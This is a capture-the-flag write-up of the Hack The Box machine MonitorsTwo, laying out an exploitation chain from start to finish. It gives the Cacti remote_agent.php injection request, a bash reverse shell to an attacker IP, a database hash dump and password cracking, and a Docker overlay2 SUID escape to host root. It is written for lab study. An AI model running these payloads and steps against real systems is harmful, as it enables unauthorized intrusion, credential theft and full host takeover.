---
layout: post
title: "HTB: MonitorsTwo"
subtitle: "Cacti unauth RCE inside a container, crack marcus, then a Docker overlay2 escape to host root"
date: 2023-05-02
tags: [htb, linux, cacti, rce, docker, container-escape]
category: writeups
kind: machine
tldr: "Cacti is vulnerable to unauthenticated RCE via remote_agent.php (CVE-2022-46169), landing www-data inside a Docker container. The container config.php has database creds, I crack marcus's bcrypt to funkymonkey and SSH in. Host root comes from CVE-2021-41091: lax overlay2 permissions let me run a SUID bash planted from inside the container."
---

## the box

MonitorsTwo is a Linux box fronted by Cacti. nmap:

```
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http  nginx 1.18.0 (Ubuntu)
```

Port 80 is a Cacti login page.

## recon

Cacti was version `1.2.22`, vulnerable to CVE-2022-46169, an unauthenticated command injection in `remote_agent.php`. The script gates access by checking the client address against authorized hosts, but it trusts the `X-Forwarded-For` header, so setting `X-Forwarded-For: 127.0.0.1` passes the check. From there the `poller_id` parameter flows unsanitized into a shell call. The request shape is `action=polldata` with a valid `host_id=1` and a `local_data_ids[]` that exists (value `6` is uptime), and the command rides on `poller_id`:

```
/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=1;<command>
```

Most public PoCs failed against this box. They detect a working `local_data_ids` by matching `rrd_name` values like `cpu` or `cmd.php` in the response, but MonitorsTwo only exposes the `uptime` template, so the brute force never finds an id. I fuzzed the ids by hand instead, `host_id=1` and `local_data_ids[0]=6` being the pair that returned data. I confirmed injection with a timing probe before the reverse shell:

```
poller_id=1;sleep 5
```

The response went from ~255ms to ~5.2s, so the command ran. Then the reverse shell on `poller_id`:

```
poller_id=1;bash -i >& /dev/tcp/10.10.14.6/443 0>&1
```

## foothold

Running the exploit dropped a shell as `www-data`, but inside a Docker container, not on the host. The `/.dockerenv` file and the container-style hostname made that obvious, and linpeas later confirmed the container ID and `docker-default` AppArmor profile.

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## user

Inside the container, `/var/www/html/include/config.php` holds the database connection details pointing at the `db` host:

```php
$database_hostname = 'db';
$database_username = 'root';
$database_port     = '3306';
```

I reached the `db` host and dumped the `user_auth` table:

```bash
mysql -h db -u root -proot cacti -e 'select username,password from user_auth;'
```

That returned the Cacti accounts and their bcrypt hashes:

```
| admin  | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
| marcus | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
```

I cracked marcus's hash with hashcat:

```bash
hashcat -a 0 -m 3200 hash /usr/share/seclists/rockyou.txt
```

It fell to `funkymonkey`, and that password is reused for SSH on the actual host:

```bash
ssh marcus@10.129.51.52   # funkymonkey
```

marcus owns the user flag.

## root

marcus on the host is a regular user, and the container shell is root inside the container. A mail to marcus in `/var/mail/marcus` named the exact path forward:

```
CVE-2021-41091: This vulnerability affects Moby ... Attackers could exploit
this by traversing directory contents and executing programs on the data
directory with insufficiently restricted permissions.
```

Docker Engine before 20.10.9 leaves `/var/lib/docker/overlay2` world-traversable. Every running container's live filesystem sits at a `merged` path on the host, and without user-namespace remapping, UID 0 in the container is UID 0 on the host. So a SUID root binary created inside the container is a SUID root binary on the host, reachable by anyone who can `cd` into the overlay path.

I found the right overlay path on the host with `mount`:

```bash
mount | grep overlay
```

```
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
```

The container shell was still `www-data`, but the container is unprivileged-friendly enough to jump to root with `capsh` (GTFOBins), no exploit needed:

```bash
capsh --gid=0 --uid=0 --
```

Now root inside the container, I copied bash out and set it SUID so the bit is unambiguous:

```bash
cp /bin/bash /tmp/0xdf
chmod 4777 /tmp/0xdf
```

Then back on the host as marcus, that same binary is now SUID root under the merged path. Running it with `-p` keeps the effective UID instead of dropping privileges:

```bash
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/0xdf -p
```

That is a root shell, and the root flag.

## takeaway

The whole box is layered access: the Cacti RCE only reaches a container, the cracked password only reaches marcus, and neither is root. The escape works because two defaults line up, overlay2 at permissive permissions and no userns remapping, so container root equals host root through a path marcus is allowed to traverse. I wrote the overlay2 escape up in detail as a standalone PoC, see the [CVE-2021-41091 post]({{ '/cve-2021-41091/' | relative_url }}).
